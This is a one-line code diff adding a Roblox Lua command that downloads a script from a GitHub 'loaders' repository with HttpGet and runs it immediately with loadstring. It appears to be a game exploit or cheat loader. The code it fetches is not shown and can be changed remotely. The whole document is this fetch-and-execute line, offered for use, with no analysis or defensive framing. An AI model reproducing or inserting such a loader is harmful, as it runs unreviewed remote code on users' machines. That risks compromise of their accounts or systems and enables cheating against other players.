@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/wanted-update-spam6-vzcoxu58if0u28.lua"))()
